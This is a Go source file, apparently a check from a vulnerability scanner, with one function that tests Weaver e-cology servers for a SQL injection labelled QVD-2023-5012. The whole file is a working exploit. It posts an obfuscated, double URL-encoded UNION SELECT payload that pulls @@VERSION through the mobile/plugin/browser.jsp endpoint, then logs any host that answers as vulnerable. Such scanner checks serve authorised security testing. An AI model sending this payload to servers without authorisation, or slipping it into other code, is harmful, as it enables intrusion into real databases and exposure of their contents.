package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"regexp"
	"strings"
)

func QVD_2023_5012(u string) bool {

	PocData := "isDis=1&browserTypeId=269&keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537"
	header := make(map[string]string)
	header["Content-Type"] = "application/x-www-form-urlencoded"
	if req, err := pkg.HttpRequset(u+"/mobile/%20/plugin/browser.jsp", "POST", PocData, false, header); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "show1") {
			var pattern = "\"show1\":.([^\\\"]+)"
			re := regexp.MustCompile(pattern)
			resourceUuid := re.FindStringSubmatch(req.Body)[1]
			if strings.Contains(req.Body, resourceUuid) {
				pkg.GoPocLog(fmt.Sprintf("Found vuln weaver SQL注入-QVD_2023_5012!|%s\n", u+"/mobile/%20/plugin/browser.jsp"))
				return true
			}
		}
	}
	return false
}
